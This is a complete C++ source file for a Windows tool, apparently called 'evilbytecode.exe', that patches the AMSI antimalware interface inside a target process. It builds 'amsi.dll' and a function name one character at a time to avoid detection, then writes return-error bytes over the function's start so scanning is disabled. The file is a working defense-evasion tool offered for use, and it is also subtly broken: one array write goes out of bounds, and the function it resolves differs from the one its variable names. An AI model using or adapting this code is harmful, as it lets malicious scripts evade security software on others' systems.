#include <Windows.h>
#include <iostream>
#include <string>

class AmsiPatcher {
private:
    HANDLE hProcess;
    HMODULE hAmsiDll;
    FARPROC AmsiScanBuffer;
    DWORD pid;

    char ams1[9];       
    char ams10pen[15];   

public:
    AmsiPatcher(DWORD processId) : pid(processId), hProcess(NULL), hAmsiDll(NULL), AmsiScanBuffer(NULL) {
        ams1[0] = 'a'; ams1[1] = 'm'; ams1[2] = 's'; ams1[3] = 'i'; ams1[4] = '.'; ams1[5] = 'd'; ams1[6] = 'l'; ams1[7] = 'l'; ams1[8] = 0;
        ams10pen[0] = 'A'; ams10pen[1] = 'm'; ams10pen[2] = 's'; ams10pen[3] = 'i'; ams10pen[4] = 'O'; ams10pen[5] = 'p'; ams10pen[6] = 'e';
        ams10pen[7] = 'n'; ams10pen[8] = 'S'; ams10pen[9] = 'e'; ams10pen[10] = 's'; ams10pen[11] = 's'; ams10pen[12] = 'i'; ams10pen[13] = 'o';
        ams10pen[14] = 'n'; ams10pen[15] = 0;
    }

    ~AmsiPatcher() {
        if (hAmsiDll) {
            FreeLibrary(hAmsiDll);
        }
        if (hProcess) {
            CloseHandle(hProcess);
        }
    }

    void PatchAmsi() {
        hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
        if (!hProcess) {
            std::cerr << "Failed to open process with PID " << pid << "!" << std::endl;
            return;
        }

        hAmsiDll = LoadLibraryA(ams1);
        if (!hAmsiDll) {
            std::cerr << "Failed to load " << ams1 << "!" << std::endl;
            CloseHandle(hProcess);
            return;
        }

        AmsiScanBuffer = GetProcAddress(hAmsiDll, ams10pen);
        if (!AmsiScanBuffer) {
            std::cerr << "Failed to find " << ams10pen << "!" << std::endl;
            FreeLibrary(hAmsiDll);
            CloseHandle(hProcess);
            return;
        }

        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // patch
        DWORD oldProtect;

        if (!VirtualProtectEx(hProcess, AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            std::cerr << "Failed to change memory protection!" << std::endl;
            FreeLibrary(hAmsiDll);
            CloseHandle(hProcess);
            return;
        }

        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, AmsiScanBuffer, patch, sizeof(patch), &bytesWritten)) {
            std::cerr << "Failed to write memory!" << std::endl;
            VirtualProtectEx(hProcess, AmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
            FreeLibrary(hAmsiDll);
            CloseHandle(hProcess);
            return;
        }

        VirtualProtectEx(hProcess, AmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

        std::cout << "AMSI patched successfully in process with PID " << pid << "!" << std::endl;
    }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: evilbytecode.exe <PID>" << std::endl;
        return 1;
    }

    DWORD pid = std::stoi(argv[1]);
    AmsiPatcher patcher(pid);
    patcher.PatchAmsi();

    return 0;
}
